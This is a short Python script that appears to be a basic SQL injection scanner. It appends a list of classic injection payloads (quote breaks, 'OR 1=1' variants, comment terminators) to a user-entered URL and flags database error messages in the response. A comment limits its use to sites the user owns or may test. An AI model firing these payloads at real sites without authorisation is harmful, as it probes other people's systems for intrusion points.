import requests

# Common test payloads for detecting SQL injection vulnerabilities
payloads = ["'", "' OR '1'='1", '" OR "1"="1', "'; --", '" ;--', "' OR '1'='1' --", "' OR 1=1#"]


def scan_sql_injection(url):
    vulnerable = False
    print(f"\nScanning: {url}")

    for payload in payloads:
        # Try adding the payload to each parameter
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url, timeout=5)
            content = response.text.lower()

            # Look for error messages indicating a SQL query break
            if ("sql syntax" in content or
                    "mysql" in content or
                    "warning" in content or
                    "unterminated" in content or
                    "query failed" in content):
                print(f"[+] Vulnerability detected with payload: {payload}")
                vulnerable = True
                break
        except requests.exceptions.RequestException as e:
            print(f"[-] Error connecting to {test_url}: {e}")

    if not vulnerable:
        print("[-] No SQL Injection vulnerability detected.")


if __name__ == "__main__":
    # Example: a real URL with a parameter
    # Of course, in real testing, make sure it's your own website or you have permission to test it
    target_url = input("Enter URL (with parameter, e.g., http://example.com/page.php?id=1): ")
    scan_sql_injection(target_url)
input("\nPress Enter to exit...")
